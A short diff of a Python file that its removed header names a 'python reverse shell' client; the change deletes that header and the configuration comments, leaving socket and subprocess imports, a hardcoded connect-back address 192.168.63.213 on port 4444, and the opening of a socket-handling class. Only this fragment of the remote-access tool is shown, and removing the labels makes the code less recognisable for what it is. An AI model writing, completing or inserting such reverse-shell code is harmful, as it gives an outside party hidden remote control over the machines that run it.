@@ -1,15 +1,7 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
-##############################
-#   **python reverse shell**
-# coded by: oseid Aldary
-##############################
-#Client_FILE
 import struct,socket,subprocess,os,platform,webbrowser as browser
-# server_config
 
-IP = "192.168.63.213" # Your server IP, default: localhost
-port = 4444  # #Your server Port, default: 4444################
+IP = "192.168.63.213"
+port = 4444  
 class senrev:
     def __init__(self,sock):
         self.sock = sock
